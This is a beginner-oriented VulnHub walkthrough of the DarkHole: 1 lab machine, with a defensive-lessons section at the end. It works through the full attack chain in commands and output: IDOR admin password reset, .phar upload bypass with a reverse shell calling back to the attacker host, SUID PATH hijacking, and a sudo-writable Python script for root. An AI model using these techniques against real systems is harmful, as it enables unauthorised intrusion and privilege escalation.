# DarkHole: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | DarkHole: 1 |
| **Difficulty** | Easy |
| **Author** | Jehad Alqurashi |
| **Released** | 18 July 2021 |
| **VulnHub Entry** | [https://vulnhub.com/entry/darkhole-1,724/](https://vulnhub.com/entry/darkhole-1,724/) |
| **Download** | [https://vulnhub.com/entry/darkhole-1,724/#download](https://vulnhub.com/entry/darkhole-1,724/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu) |

> Educational boot2root. Everything here is done against a machine you own and
> run in an isolated lab network. The VulnHub hint is *"Don't waste your time
> for Brute-Force"* — and it's right: there is no password to guess.

---

## 0. What you will learn

- How to enumerate a PHP web application (login, register, dashboard).
- Why an **unauthenticated registration form** is an attack surface.
- What **IDOR / parameter tampering** is, and how a hidden `id` field lets you
  reset the *admin's* password.
- How a weak **file-upload blacklist** can be bypassed with an alternative PHP
  extension (`.phar`, `.phtml`) to get a reverse shell.
- How to find and abuse a **SUID binary that calls a command without an absolute
  path** (PATH hijacking) to move from `www-data` to a user.
- How a `sudo`-allowed Python script that the user can edit yields **root**.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the lab NIC is usually eth0)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:xx:xx:xx   (your Kali)
192.168.56.101  08:00:27:a1:b2:c3   (DarkHole — the target)
```

**Target IP:** `192.168.56.101` (yours may differ; DHCP assigns it).

![recon — finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 22,80 -oA scans/services 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

> **How to read it:** SSH on 22 and a web server on 80. A login page implies
> user accounts, so the web app is our main target.

![nmap service scan output](images/02-nmap.png)

```bash
# Enumerate web content and note the PHP pages
ffuf -c -u http://192.168.56.101/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc all -fc 404 -e .php,.html,.txt
```

```text
index.php
login.php
register.php
logout.php
dashboard.php
upload/        (Status: 301)
config/        (Status: 301)
css/  js/
```

Browsing the site reveals a **Login** page with a **"Sign up now"** link. The
author's hint tells us brute-force is a dead end — so we look at the app logic.

> **Common beginner mistake:** trying SQL injection (`' OR 1=1-- -`) on
> `login.php`. On this build the login form is **not** SQL-injectable, and many
> writeups confirm it fails. Don't sink time into it — the real bug is the
> **registration + password-reset logic** below.

![web enumeration](images/03-enum.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Create an account and find the IDOR

```bash
# Register a normal account through the browser (or curl the POST)
#   http://192.168.56.101/register.php
# then log in at http://192.168.56.101/login.php
```

After logging in you land on `dashboard.php?id=2`. The URL exposes your user id.

> **Why it matters:** the software assigns ids sequentially. We are **id=2**,
> which strongly implies the **admin is id=1**.

The dashboard has a "change password" form. Intercept it with Burp Suite (or
the browser's dev tools → "Edit and Resend"):

```text
POST /dashboard.php?id=2 HTTP/1.1
Host: 192.168.56.101
...

id=2&password=test123&cpassword=test123
```

Change only the `id` — leave everything else — and resend:

```text
id=1&password=hacked123&cpassword=hacked123
```

```text
HTTP/1.1 200 OK
```

> **Why it works (the bug):** the server trusts the `id` sent by the client and
> changes the password for *that* id — with no check that the id belongs to the
> logged-in session. This is an **IDOR** combined with a mass-assignment /
> parameter-tampering flaw. We just reset **admin**'s password.

Log in as the admin:

```text
URL:      http://192.168.56.101/login.php
Username: admin
Password: hacked123
```

The admin account has an extra feature the normal user does not: **file upload**.

![IDOR password reset → admin panel](images/04-foothold.png)

### 3.2 File-upload bypass and reverse shell

Try to upload a PHP web shell. The server rejects it:

```text
Sorry , Allow Ex : jpg,png,gif
```

> **Why it works (the bypass):** the server uses a **blacklist** that only checks
> a fixed set of "bad" extensions (`php`, `php3`, `php4`, `php5`, ...). Alternate
> extensions that PHP also executes — `.phar`, `.phtml`, `.phtm` — are not on the
> list. On this build `.phar` and `.phtml` both execute.

```bash
# Grab a ready-made PHP reverse shell and rename the extension
cp /usr/share/webshells/php/php-reverse-shell.php shell.phar
# Edit LHOST/LPORT inside the file to 192.168.56.10:443
```

```bash
# Start the listener BEFORE triggering the shell
nc -lvnp 443
```

Upload `shell.phar` through the admin panel. The response tells you where it
landed:

```text
File uploaded successfully: /upload/shell.phar
```

Browse to `http://192.168.56.101/upload/shell.phar` to trigger it.

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 44210
Linux darkhole 5.4.0-... #... SMP ...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Upgrade to a full TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then press Ctrl+Z, run:  stty raw -echo; fg   and:  export TERM=xterm
```

![upload bypass → reverse shell](images/05-shell.png)

---

## 4. Privilege escalation — becoming root

### 4.1 The SUID binary `toto`

```bash
ls -l /home/john/
find / -perm -4000 -type f 2>/dev/null
```

```text
-rwxrwx--- 1 john john     1 file.py
-rwxrwx--- 1 john john     8 password
-rwsr-xr-x 1 root root 16784 toto      <-- SUID root, owned by root
-rw-rw---- 1 john john    24 user.txt

/usr/bin/pkexec
/usr/bin/sudo
/home/john/toto
```

Running it reveals what it does:

```bash
cd /home/john && ./toto
```

```text
uid=1001(john) gid=33(www-data) groups=33(www-data)
```

```bash
strings toto | head
```

```text
setuid
system
setgid
```

> **Why it works:** `toto` is a root-owned SUID program that calls `setuid(john)`
> and then runs the `id` command via `system("id")` — **without the absolute path
> `/usr/bin/id`**. Because the shell resolves `id` through `$PATH`, we can place
> our own `id` earlier in `PATH` and it will run **as john**.

```bash
cd /tmp
echo -e '#!/bin/bash\nbash -p' > id     # our fake "id"
chmod +x id
export PATH=/tmp:$PATH                   # /tmp searched first

cd /home/john
./toto                                   # executes our /tmp/id as john
```

```text
john@darkhole:~$ whoami
john
```

Read john's secrets in his home directory:

```bash
cat password      # john's password, e.g. root123 (varies by build)
cat user.txt
```

```text
DarkHole{You_Can_DO_It}
```

![PATH hijacking → john](images/06-user-flag.png)

### 4.2 `sudo` + writable Python script → root

```bash
sudo -l
```

```text
User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
```

> **Why it works:** `john` is allowed to run `/home/john/file.py` as root — and
> `file.py` is a file **john owns and can edit**. A "sudo rule" that points at a
> user-writable script is effectively "run anything as root".

```bash
# Correct PATH first (we hijacked it above)
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Overwrite the script with a root shell payload
cat > /home/john/file.py <<'EOF'
import os
os.system("/bin/bash")
EOF

sudo /usr/bin/python3 /home/john/file.py
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

Alternatively, if you'd rather make bash SUID and the correct owner/perms are
intact (`-rwxr-xr-x root root`):

```bash
echo 'import os; os.system("chmod +s /bin/bash")' > /home/john/file.py
sudo /usr/bin/python3 /home/john/file.py
bash -p
```

### The root flag

```bash
cat /root/root.txt
```

```text
DarkHole{You_Are_Legend}
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | IDOR / parameter tampering in password reset (client-supplied `id`) | `dashboard.php?id=` | Reset the **admin** password, take over the account |
| 2 | Weak file-upload blacklist (only blocks `.php`) | admin upload panel | Upload a PHP reverse shell via `.phar`/`.phtml` |
| 3 | SUID binary calling `id` without an absolute path | `/home/john/toto` | PATH hijacking → shell as `john` |
| 4 | `sudo` rule on a user-writable script | `sudo` + `/home/john/file.py` | Run arbitrary code as **root** |

## 6. Defensive lessons (blue team)

- **Authorise every request server-side.** Never trust an `id` (or any
  identifier) from the client; derive the subject from the authenticated session.
- **Validate file uploads by allow-list on the *final* parsed type**, store them
  **outside the web root**, and never let a user-controlled filename pick the
  handler. Renaming to `.phar`/`.phtml` should never execute.
- **Use absolute paths in privileged code** (`system("/usr/bin/id")`) and sanitise
  `PATH` before invoking any external command. Remove unnecessary SUID bits.
- **Never `sudo` a script a user can write.** Reference root-owned, read-only
  files; keep `secure_path` and avoid wildcards in sudoers.
- **Detect:** monitor for password-change requests where the `id` differs from the
  session user; alert on PHP files added to upload directories; watch for
  `chmod +s` on `/bin/bash` and for `sudo` invoking user-writable paths.

---

## 7. References

- VulnHub entry: [https://vulnhub.com/entry/darkhole-1,724/](https://vulnhub.com/entry/darkhole-1,724/)
- Community writeups consulted:
  - [Infosec Articles — DarkHole VulnHub Writeup](https://www.infosecarticles.com/darkhole-vulnhub-writeup/)
  - [wh01s17 — DarkHole 1](https://www.wh01s17.com/blog/05-darkhole_1)
  - [NepCodeX — DarkHole Walkthrough](https://nepcodex.com/2021/08/darkhole-walkthrough-vulnhub-writeup/)
- Background reading:
  - [OWASP — Insecure Direct Object References (IDOR)](https://owasp.org/www-project-top-ten/2017/A4_2017-Broken_Access_Control)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [GTFOBins](https://gtfobins.github.io/)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target (arp-scan)
- [ ] `images/02-nmap.png` — port/service scan (22, 80)
- [ ] `images/03-enum.png` — web enumeration (login/register/dashboard/upload)
- [ ] `images/04-foothold.png` — IDOR password reset → admin panel
- [ ] `images/05-shell.png` — `.phar` upload → reverse shell as `www-data`
- [ ] `images/06-user-flag.png` — PATH hijack → `john` + user flag
- [ ] `images/07-privesc.png` — `sudo` writable `file.py` → root
- [ ] `images/08-root-flag.png` — root flag (`root.txt`)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
